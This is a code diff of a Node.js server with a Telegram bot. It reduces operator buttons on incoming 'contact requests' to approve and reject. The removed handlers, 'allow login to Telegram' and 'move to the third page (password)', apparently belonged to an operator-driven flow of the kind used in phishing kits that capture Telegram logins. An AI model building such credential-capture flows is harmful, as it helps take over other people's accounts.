@@ -366,7 +366,7 @@ app.get(
 
 
 // ============================================================
-// طلب تواصل - مع 3 أزرار ✅
+// طلب تواصل - مع زرين فقط ✅
 // ============================================================
 
 app.post(
@@ -459,7 +459,7 @@ app.post(
             );
 
 
-            // ✅ إرسال رسالة مع 3 أزرار
+            // ✅ إرسال رسالة مع زرين فقط (قبول / رفض)
             await bot.sendMessage(
 
                 telegramId,
@@ -481,25 +481,15 @@ ${requestId}
 
                             [
                                 {
+                                    text: "✅ قبول",
+                                    callback_data:
+                                        `approve:${requestId}`
+                                },
+
+                                {
                                     text: "❌ رفض",
                                     callback_data:
                                         `reject:${requestId}`
-                                }
-                            ],
-
-                            [
-                                {
-                                    text: "✅ السماح بالدخول",
-                                    callback_data:
-                                        `approve_telegram:${requestId}`
-                                }
-                            ],
-
-                            [
-                                {
-                                    text: "🔑 الانتقال للصفحة الثالثة",
-                                    callback_data:
-                                        `third_page:${requestId}`
                                 }
                             ]
 
@@ -808,7 +798,7 @@ ${username}
 
 
 // ============================================================
-// أزرار البوت - مع 3 حالات ✅
+// أزرار البوت - زرين فقط (قبول / رفض) ✅
 // ============================================================
 
 bot.on(
@@ -822,6 +812,53 @@ bot.on(
 
             const data =
                 query.data;
+
+
+            // =================================================
+            // ✅ قبول
+            // =================================================
+
+            if (
+                data.startsWith("approve:")
+            ) {
+
+                const requestId =
+                    data.split(":")[1];
+
+
+                await updateRequestStatus(
+                    requestId,
+                    "approved"
+                );
+
+
+                await bot.answerCallbackQuery(
+
+                    query.id,
+
+                    {
+                        text:
+                            "✅ تم قبول الطلب"
+                    }
+
+                );
+
+
+                await bot.editMessageText(
+
+                    `✅ تم قبول طلب التواصل`,
+
+                    {
+                        chat_id: chatId,
+                        message_id:
+                            query.message.message_id
+                    }
+
+                );
+
+
+                return;
+            }
 
 
             // =================================================
@@ -857,100 +894,6 @@ bot.on(
                 await bot.editMessageText(
 
                     `❌ تم رفض طلب التواصل`,
-
-                    {
-                        chat_id: chatId,
-                        message_id:
-                            query.message.message_id
-                    }
-
-                );
-
-
-                return;
-            }
-
-
-            // =================================================
-            // ✅ السماح بالدخول (رابط Telegram)
-            // =================================================
-
-            if (
-                data.startsWith("approve_telegram:")
-            ) {
-
-                const requestId =
-                    data.split(":")[1];
-
-
-                await updateRequestStatus(
-                    requestId,
-                    "approved_telegram"
-                );
-
-
-                await bot.answerCallbackQuery(
-
-                    query.id,
-
-                    {
-                        text:
-                            "✅ تم السماح بالدخول إلى Telegram"
-                    }
-
-                );
-
-
-                await bot.editMessageText(
-
-                    `✅ تم السماح بالدخول إلى Telegram`,
-
-                    {
-                        chat_id: chatId,
-                        message_id:
-                            query.message.message_id
-                    }
-
-                );
-
-
-                return;
-            }
-
-
-            // =================================================
-            // 🔑 الانتقال للصفحة الثالثة
-            // =================================================
-
-            if (
-                data.startsWith("third_page:")
-            ) {
-
-                const requestId =
-                    data.split(":")[1];
-
-
-                await updateRequestStatus(
-                    requestId,
-                    "third_page"
-                );
-
-
-                await bot.answerCallbackQuery(
-
-                    query.id,
-
-                    {
-                        text:
-                            "🔑 تم الانتقال للصفحة الثالثة"
-                    }
-
-                );
-
-
-                await bot.editMessageText(
-
-                    `🔑 تم الانتقال للصفحة الثالثة (كلمة المرور)`,
 
                     {
                         chat_id: chatId,
